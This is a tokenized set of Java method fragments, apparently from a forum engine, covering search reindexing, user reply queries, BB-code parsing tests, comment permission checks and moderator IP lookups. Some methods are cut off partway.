public void setAsText ( String s ) throws IllegalArgumentException { setValue ( SearchRange . valueOf ( s . toUpperCase ( ) ) ) ; } 
public void handleMessage ( UpdateMessage msgUpdate ) throws MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; solrServer . commit ( ) ; } 
public void handleMessage ( UpdateMonth msgUpdate ) throws MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = messageDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } solrServer . commit ( ) ; long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private static String buildParams ( Map < String , String > params ) { StringBuilder str = new StringBuilder ( ) ; for ( Entry < String , String > entry : params . entrySet ( ) ) { if ( str . length ( ) > 0 ) { str . append ( '&' ) ; } try { str . append ( URLEncoder . encode ( entry . getKey ( ) , " UTF-8 " ) ) ; str . append ( '=' ) ; str . append ( URLEncoder . encode ( entry . getValue ( ) , " UTF-8 " ) ) ; } catch ( UnsupportedEncodingException e ) { throw new RuntimeException ( e ) ; } } return str . toString ( ) ; } 
private void initializeSectionList ( ) { Builder < Section > sectionListBuilder = ImmutableList . builder ( ) ; List < Section > sections = sectionDao . getAllSections ( ) ; sectionListBuilder . addAll ( sections ) ; sectionList = sectionListBuilder . build ( ) ; } 
public List < ArchiveDTO > get ( ) { return archiveDao . getArchiveDTO ( sectionNews , 13 ) ; } 
public List < TagDTO > get ( ) { return getTagDao ( ) . getTags ( i ) ; } 
public void execute ( Object o ) { TopTenMessageDTO dto = ( TopTenMessageDTO ) o ; int tmp = dto . getAnswers ( ) / itemsPerPage ; tmp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? tmp + 1 : tmp ; dto . setPages ( tmp ) ; } 
public boolean supports ( Class clazz ) { return EditBoxesRequest . class . isAssignableFrom ( clazz ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) throws Exception { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDTO > items = archiveDao . getArchiveDTO ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public Set < Integer > get ( User user ) { final Builder < Integer > builder = ImmutableSet . builder ( ) ; jdbcTemplate . query ( queryIgnoreList , new RowCallbackHandler ( ) { @Override public void processRow ( ResultSet resultSet ) throws SQLException { builder . add ( resultSet . getInt ( " ignored " ) ) ; } } , user . getId ( ) ) ; return builder . build ( ) ; } 
public List < RepliesListItem > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , final boolean readMessage , final boolean secure , Filter filter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( filter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < RepliesListItem > ( ) { @Override 
private static void printLine ( int indentLevels , String text , String value ) { if ( value = = null | | value . isEmpty ( ) ) { treturn ; } twhile ( indentLevels - - > 0 ) { tSystem . out . print ( " " ) ; } if ( text ! = null & & ! text . isEmpty ( ) ) { tSystem . out . print ( text ) ; tSystem . out . print ( " " ) ; } tSystem . out . println ( value ) ; } 
public static boolean checkLoginName ( String login ) { login = login . toLowerCase ( ) ; no zerosize login if (login.isEmpty()) { return false; } if (login.length() >= 80) { return false; } return loginCheckRE.matcher(login).matches(); } 
private static Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node tempNode = currentNode ; while ( true ) { if ( tempNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( tempNode ) ) { TagNode node = ( TagNode ) tempNode ; String tagName = node . getBbtag ( ) . getName ( ) ; if ( tagName . equals ( name ) | | ( " url " . equals ( name ) & & " url2 " . equals ( tagName ) ) ) { currentNode = tempNode ; currentNode = ascend ( currentNode ) ; break ; } } tempNode = tempNode . getParent ( ) ; } return currentNode ; } 
public boolean isParameter ( ) { return ( parameter ! = null ) & & ( ! parameter . isEmpty ( ) ) ; } 
public boolean isComment ( ) { return cutType = = CutType . INCOMMENT ; } 
public boolean isTopicMinimized ( ) { return cutType = = CutType . INTOPIC_MINIMIZED ; } 
public boolean isTopicMaximized ( ) { return cutType = = CutType . INTOPIC_MAXIMIZED ; } 
public void sectionsTest ( ) { List < Section > sectionList = sectionDao . getAllSections ( ) ; Assert . assertEquals ( 4 , sectionList . size ( ) ) ; String addInfo = sectionDao . getAddInfo ( sectionList . get ( 0 ) . getId ( ) ) ; Assert . assertNotNull ( addInfo ) ; } 
public void sectionsScrollModeTest ( ) { List < Section > sectionList = sectionDao . getAllSections ( ) ; Section section = getSectionById ( sectionList , 1 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 2 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . GROUP , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 3 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 5 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; 
public void getScrollModeTest ( ) throws Exception { Section section = sectionService . getSection ( 1 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 2 ) ; Assert . assertEquals ( SectionScrollModeEnum . GROUP , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 3 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 4 ) ; Assert . assertEquals ( SectionScrollModeEnum . NO_SCROLL , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 5 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; 
public static ResultSet getAnonymous ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 2 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " anonymous " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( - 117654 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 4 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Anonymous " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 161 ) ; return resultSet ; } 
public static ResultSet getModerator ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 5280 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " svu " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Sergey V. Udaltsov " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " 0vwkMky44u8kIqSasrH+X8mHao1a3jOC " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( " 5280.png " ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 2 ) ; return resultSet ; } 
public static ResultSet getUser5star ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 13 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user5star " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 5 star " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser1star ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 14 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user1star " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 1 star " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45Score ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 15 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user45score " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 45 score " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45ScoreBlocked ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 16 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " userBlocked " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( true ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " blocked " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , true ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Topic message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView mv = new ModelAndView ( " history " ) ; List < String > javaScriptsForLayout = new ArrayList < String > ( ) ; javaScriptsForLayout . add ( " diff_match_patch.js " ) ; javaScriptsForLayout . add ( " lor_view_diff_history.js " ) ; mv . addObject ( " javascriptsForLayout " , javaScriptsForLayout ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public boolean isAllowRegistredPosting ( ) { return ! isBlocked ( ) | | allowPosting ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; int userAgentId = 0 ; if ( msgid ! = null ) { SqlRowSet rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM topics WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM comments WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { throw new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { throw new ScriptErrorException ( " No IP data for # " + msgid ) ; } } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " topics " , getTopics ( ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( ip , userAgentId ) ) ; IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; Boolean allowPosting = false ; Boolean captchaRequired = true ; if ( blockInfo . isInitialized ( ) ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; allowPosting = blockInfo . isAllowRegistredPosting ( ) ; captchaRequired = blockInfo . isCaptchaRequired ( ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . addObject ( " allowPosting " , allowPosting ) ; mv . addObject ( " captchaRequired " , captchaRequired ) ; mv . getModel ( ) . put ( " tor " , IPBlockDao . getTor ( ip ) ) ; return mv ; } 
public void getSectionTest ( ) throws Exception { Section section = sectionService . getSection ( 3 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( " Section 3 " , section . getName ( ) ) ; Assert . assertTrue ( section . isPremoderated ( ) ) ; Assert . assertFalse ( section . isVotePoll ( ) ) ; Assert . assertTrue ( section . isImagepost ( ) ) ; section = sectionService . getSection ( 2 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( " Section 2 " , section . getName ( ) ) ; Assert . assertTrue ( section . isPremoderated ( ) ) ; Assert . assertFalse ( section . isVotePoll ( ) ) ; Assert . assertFalse ( section . isImagepost ( ) ) ; try { section = sectionService . getSection ( - 1 ) ; 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , toHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , toHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , toHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , toHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , toHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , toHtmlFormatter . format ( TEXT16 , false ) ) ; assertEquals ( RESULT17 , toHtmlFormatter . format ( TEXT17 , false ) ) ; assertEquals ( RESULT18 , toHtmlFormatter . format ( TEXT18 , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , final boolean readMessage , final boolean secure , Filter filter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( filter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , Filter filter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( filter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public UserEvent mapRow ( ResultSet resultSet , int i ) throws SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; int cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { cAuthor = resultSet . getInt ( " cAuthor " ) ; cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = 0 ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; EventType type = EventType . valueOf ( resultSet . getString ( " type " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; boolean unread = resultSet . getBoolean ( " unread " ) ; return new UserEvent ( cid , cAuthor , cDate , groupTitle , groupUrlName , sectionId , subj , lastmod , msgid , type , eventMessage , eventDate , unread ) ; 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public boolean isEditable ( User by ) { return TopicPermissionService . isEditable ( this , by ) ; } 
public boolean isCommentsAllowed ( User user ) { return TopicPermissionService . isCommentsAllowed ( message , user ) ; } 
public static boolean isCommentsAllowed ( Topic topic , User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) ) { return false ; } int score = topic . getPostScore ( ) ; if ( score = = Topic . POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = Topic . POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = Topic . POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getUid ( ) ; if ( score = = Topic . POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public boolean isDeletableByUser ( Topic topic , User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( topic . getPostdate ( ) . compareTo ( hourDeltaTime ) > = 0 & & topic . getUid ( ) = = user . getId ( ) ) ; } 
public boolean isCommentsAllowed ( ) { return commentsAllowed ; } 
public boolean isCommentsAllowed ( Topic topic , User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) ) { return false ; } int score = topic . getPostScore ( ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure ) ; TopicMenu topicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public String handleUserBanedException ( UserBanedException ex , HttpServletRequest request , HttpServletResponse response ) { response . setStatus ( HttpServletResponse . SC_FORBIDDEN ) ; return " error-user-banned " ; } 
public String handleUserBanedException ( UserBanedException ex , HttpServletRequest request , HttpServletResponse response ) { return " error-user-banned " ; } 
protected void findURLIds ( ) throws URIException { if ( _true_lor_url ) { find message id in lor url 
public String toString ( ) { return getEscapedURIReference ( ) ; } 
public String toUnEscapedString ( ) { try { return getURIReference ( ) ; 
public boolean isTrueLorUrl ( ) { return _true_lor_url ; } 
public boolean isMessageUrl ( ) { return _topic_id ! = - 1 ; } 
public boolean isCommentUrl ( ) { return _comment_id ! = - 1 ; } 
public String formatUrlBody ( int maxLength ) throws URIException { String all = getURIReference ( ) ; String scheme = getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( _true_lor_url ) { if ( uriWithoutScheme . length ( ) < maxLength ) { 
public String fixScheme ( boolean secure ) throws URIException { if ( ! _true_lor_url ) { return toString ( ) ; } String host = getHost ( ) ; int port = getPort ( ) ; String path = getPath ( ) ; String query = getQuery ( ) ; String fragment = getFragment ( ) ; if ( ! secure ) { return ( new HttpURL ( null , host , port , path , query , fragment ) ) . getEscapedURIReference ( ) ; 
